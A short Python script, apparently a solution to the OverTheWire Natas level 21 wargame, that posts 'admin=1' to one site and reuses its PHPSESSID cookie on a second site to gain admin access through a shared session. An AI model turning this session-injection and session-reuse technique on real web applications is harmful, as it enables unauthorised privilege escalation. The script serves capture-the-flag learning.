import requests
from requests.auth import HTTPBasicAuth
url1 = 'http://localhost1/'
url2 = 'http://localhost2/'
auth = HTTPBasicAuth('user', 'password')
payload = {'admin': '1', 'submit': 'Update'}

session1 = requests.Session()

response = session1.post(url2, auth=auth, data=payload, params={'debug': ''})
phpsessionid = response.cookies.get('PHPSESSID')
print(response.text)

session2 = requests.Session()
#session2.cookies.set('PHPSESSID', sessid, domain='natas21.natas.labs.overthewire.org')
response = session2.get(url1, auth=auth, cookies={'PHPSESSID': phpsessionid})

print(response.text)

